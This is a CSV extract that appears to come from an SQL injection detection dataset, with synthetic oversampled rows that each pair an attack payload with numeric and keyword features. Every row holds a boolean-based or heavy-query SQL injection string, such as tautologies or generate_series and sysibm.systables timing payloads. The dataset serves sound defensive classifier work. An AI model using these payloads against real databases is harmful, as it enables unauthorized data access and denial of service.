id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000399,attack,boolean,"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",nearest_attack_euclidean,R000576,0.747327334668883,72.41440222304897,28.68574169954093,4.036831070281616,20.0143062746557,19.68574169954093,23.042918823967096,9.671435424885233,0.2777245571120463,0.27233825260196814,0.31537898496640615,0.13455820531957935,1.6571291502295342,0.0,2.0,0.0,0.0,2.0,0.0,2.342870849770465,0.0,0.6714354248852328,0.671435424885233,4.328564575114767,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3285645751147671,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3285645751147674
SMOTE_000400,attack,boolean,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,nearest_attack_euclidean,R000063,0.05508918187340431,56.88403584002329,22.942017920011644,3.7034065784632992,24.0,4.0,19.0,9.88403584002329,0.42194039548307527,0.07032339924717922,0.33403614642410123,0.1737000588456442,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,6.884035840023291,0.0,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000401,attack,boolean,-9509'   )    )     )   or 1091  =  5477 and    (    (     (  'gsmz'  =  'gsmz,nearest_attack_euclidean,R000738,0.38185927623217086,73.29178093541343,19.412465719375973,3.075512022320693,13.0,12.0,36.23342474833074,12.058356187082683,0.17820641927594746,0.1644982331777977,0.4929366314014443,0.1643587161448105,4.0,0.0,1.0,0.0,0.0,2.0,0.0,5.058356187082685,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000402,attack,boolean,"1"" where 4652  =  4652 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000907,0.5874455063383289,128.096736774782,35.0,3.8837955297988307,38.548368387390994,23.0,49.548368387390994,17.0,0.3006111992850768,0.17984087907620522,0.38662205449543585,0.13292586714328214,2.0,0.7419386021015013,2.0,1.0,0.0,2.0,0.0,8.258061397898498,0.0,0.0,1.0,5.0,1.0,0.7419386021015013,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000403,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000991,0.035774053936333795,40.0,12.176028281556246,2.595102113296753,2.0,12.0,20.0,6.0,0.04999999999999999,0.3,0.5,0.15,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000404,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000479,0.37180978860919883,136.67913601933833,32.26417279613233,3.6071569321916837,36.0,16.0,58.679136019338344,26.0,0.26356154343884847,0.11713846375059933,0.4289499892158283,0.19035000359472393,0.13208639806616573,0.0,2.0,0.0,0.0,1.0,0.0,12.735827203867668,0.13208639806616562,1.9999999999999998,1.0,9.0,0.13208639806616562,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000405,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000414,0.466424902129368,123.26984755233225,26.73015244766775,3.5075267093337663,43.079390209329,13.0,53.4603048953355,13.730152447667749,0.3494250851396219,0.10546105309596648,0.43371660990691874,0.1113972518574929,0.0,4.0,0.0,0.0,0.0,1.7301524476677494,0.0,8.0,0.0,0.0,0.0,1.730152447667749,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000406,attack,boolean,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""dacx""  =  ""dacx",nearest_attack_euclidean,R000902,0.18360272994926918,160.7779507358442,29.915053027746374,3.8540608484565446,78.79731440288768,8.0,54.150530277463766,19.830106055492752,0.49258735652835794,0.04989528620197027,0.33448763357704603,0.12302972369262574,0.0,4.0,0.0,0.0,1.0,2.0,0.0,7.830106055492752,0.0,0.0,2.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000407,attack,boolean,"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001008,0.8892887694795667,96.42346927733128,27.423469277331282,3.5933308319499213,31.0,13.0,39.0,13.423469277331282,0.3215069214350011,0.1348254831824198,0.4044764495472595,0.13919114583531964,0.4234692773312827,0.0,2.0,0.0,1.0,1.0,0.0,7.0,0.0,1.0,1.0,4.0,0.4234692773312825,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000408,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000872,0.006319315947613497,62.0,21.0,3.5071816737269095,14.0,17.0,24.0,7.0,0.22580645161290325,0.27419354838709675,0.3870967741935484,0.11290322580645161,1.0,0.0,2.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000409,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000300,0.030762371438050676,163.1215323501915,33.88287098002554,4.0697781975617735,81.6486129400766,16.0,48.53148392010213,16.94143549001277,0.5005895756038983,0.09813617132087642,0.29739762144939297,0.1038766316258323,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.941435490012767,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000410,attack,boolean,"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- zimf",nearest_attack_euclidean,R000286,0.16620169232753357,234.951793952696,37.63198126842691,3.8264940283321645,74.60152882002225,27.0,93.23351008844915,40.11675504422459,0.31738741694516154,0.11545619345272895,0.3966342660913505,0.17052212351075902,0.0,0.0,2.0,0.0,0.0,1.0,0.0,21.55837752211229,0.0,1.9263962536853818,3.9263962536853816,12.705585014741526,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.852792507370764,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.852792507370763
SMOTE_000411,attack,boolean,or 1  =  1 or ''  =  ',nearest_attack_euclidean,R000015,0.32436704331804855,21.18391264650596,6.0,2.1567904443842654,4.0,1.7959781616264898,10.48994540406622,4.897989080813243,0.19241671887654607,0.08163537098302219,0.4927135057723746,0.23323440436805715,3.0,0.0,0.0,0.0,0.0,1.897989080813244,0.0,0.0,0.0,0.0,0.0,1.8979890808132436,1.0,0.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.897989080813244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.897989080813244
SMOTE_000412,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R001305,0.018118947518660066,96.06175066106064,28.97529973557574,3.6146898886385674,32.09880105769705,12.938249338939343,39.0,12.024700264424263,0.3341077640661072,0.13472248122363742,0.4060016217222189,0.12516813298803645,1.0247002644242627,0.0,0.0,0.0,1.0,1.0,0.0,7.0,0.0,1.0,1.0,1.9999999999999996,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000413,attack,boolean,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",nearest_attack_euclidean,R000336,0.6538830020606492,194.58413935705994,34.270793032147004,3.9139466190790286,68.0,24.021276646382958,72.10444877497098,30.45841393570599,0.35022995899222015,0.12251343240655484,0.37060176229366,0.15665484630756502,0.0,3.7292069678529964,0.0,0.0,0.0,1.0,0.0,15.729206967852996,0.0,1.2707930321470036,3.2707930321470036,6.458413935705993,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.7292069678529964,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.458413935705993,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.187620903558988
SMOTE_000414,attack,boolean,"1%'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R001417,0.047395653169185877,175.92197158508645,31.960985792543227,3.8504887563749985,74.01950710372839,8.980492896271615,66.96098579254323,25.96098579254323,0.4207586995560187,0.051046148436774116,0.38062768906206446,0.14756746294514272,4.0,0.0,0.0,0.0,1.0,2.0,0.0,10.0,2.0,0.0,2.980492896271614,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0195071037283856,0.9804928962716144,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000415,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'aicu'  =  'aicu",nearest_attack_euclidean,R001318,0.805976774079607,356.28639848967623,40.742720302064754,3.718498212747508,112.94176241651805,37.058237583481954,152.80095788554672,53.48544060412951,0.3170687780246568,0.10395657586069973,0.4288348503711109,0.15013979574353253,2.9708812082590237,0.0,0.0,0.0,0.0,2.0,0.0,32.514559395870485,0.0,1.9999999999999998,4.0,12.0,0.742720302064756,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.0
SMOTE_000416,attack,boolean,"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001179,0.037481286828280044,154.54902008950577,35.946943539941856,4.311618405111923,79.73471769970928,16.0,41.86735884985464,16.946943539941856,0.5158933911311115,0.10356314532809292,0.27089208873156745,0.10965137480922812,1.0,0.0,2.0,0.0,1.0,2.0,0.0,4.973471769970928,0.0,0.0,2.0,5.973471769970928,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.9734717699709283,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.973471769970928
SMOTE_000417,attack,boolean,1' and 4595  =  4595#,nearest_attack_euclidean,R001178,0.40876001704849674,21.0,12.263385498366928,3.2427580414129604,3.0,9.0,6.0,3.0,0.14285714285714285,0.42857142857142855,0.2857142857142857,0.14285714285714285,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000418,attack,boolean," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000050,0.12001679300099327,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.8493127223144931,0.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000419,attack,boolean,"1"" where 9973  =  9973 and 2006  =  2006",nearest_attack_euclidean,R000454,0.5102991639001238,39.785749870422464,16.57149974084495,3.4985913965531035,8.0,17.0,12.0,2.785749870422471,0.2010987186132181,0.4273347770530884,0.3016480779198271,0.06991842641386635,0.0,0.7857498704224735,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,0.7857498704224735,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000420,attack,boolean,"-4033'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ouup'  =  'ouup",nearest_attack_euclidean,R001502,1.1495249875445002,386.4811629048136,32.67314639496709,3.3565128982938477,102.44228453501097,48.67314639496709,179.69258557986836,55.67314639496709,0.2652195498155579,0.12591499504757273,0.4648296300009266,0.14403582513594274,4.0,0.0,0.557715464989031,0.0,0.0,3.0,0.0,37.11543092997806,0.0,0.0,1.0,13.55771546498903,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.442284535010969,0.5577154649890311,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000421,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000563,0.5239260646518019,120.98404400494127,30.0,3.5034188030277154,34.0,13.0,54.32003667078439,19.664007334156878,0.28368715421424856,0.10846861778780093,0.4453494312461993,0.16249479675175127,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.664007334156878,2.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000422,attack,boolean,"-8454"" or 6872  =  6872",nearest_attack_euclidean,R001407,0.007620602327208398,22.999999999999986,12.0,3.291434196031555,2.0,12.0,6.0,3.0,0.08695652173913043,0.5217391304347826,0.2608695652173913,0.13043478260869565,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999996,0.0,1.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000423,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000532,0.38455086339516137,164.65766857760383,34.11936897937129,3.8853739346920473,58.925679185658375,15.28378612377225,61.80631020628709,28.641893061886126,0.3579954927097949,0.0923959766816359,0.3754263177834689,0.17418221282510024,3.0,0.0,0.0,0.0,0.0,1.0,0.0,13.641893061886124,1.0,1.9999999999999998,3.641893061886125,5.2387379587425835,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.1193689793712916,0.0,0.0,0.1193689793712917,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.641893061886125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8806310206287082
SMOTE_000424,attack,boolean,"1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001534,0.5954927861938433,160.73545796220304,32.470915924406064,4.031568092477905,74.0,18.0,48.0,20.735457962203032,0.4603872713818702,0.11198609303883328,0.2986295814368888,0.12899705414240778,0.0,0.7354579622030337,2.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,0.0,0.7354579622030337,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000425,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001091,0.20096369740372735,128.7312206009528,28.0,3.925328198726685,62.0,10.0,36.442683834127344,20.28853676682547,0.48261134174740106,0.0778405389915163,0.2819628488100928,0.15758527045098975,1.0,0.0,2.0,0.0,1.0,1.0,0.0,5.288536766825469,1.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000426,attack,boolean,"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001122,0.16283089003146967,199.46265025872708,34.15421675290902,3.8462166475833195,58.0,35.0,76.30843350581804,30.154216752909026,0.29079951672984017,0.17548246699214495,0.382552196298432,0.15116581997958287,0.0771083764545124,0.0,2.0,0.0,0.0,2.0,0.0,16.07710837645451,0.0,1.0,3.0,10.0,0.0771083764545124,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000427,attack,boolean,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000404,0.6244061369286092,69.31263909913733,24.83751669189648,3.6457511376699023,15.837516691896479,19.450022255861974,26.575077895516905,7.450022255861972,0.23226651523077524,0.28480692384697887,0.37726833159246154,0.10565822932978432,0.0,0.0,2.0,0.0,0.0,2.0,0.0,2.8375166918964796,0.0,0.0,0.6125055639654934,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000428,attack,boolean,"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R001379,0.2500991481901283,75.47522266683643,28.05320850006366,3.90668768109989,19.10641700012732,21.0,25.368805666709108,10.0,0.25189026556893146,0.27894145128139836,0.33633902063471854,0.13282926251495158,0.0,1.0,2.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
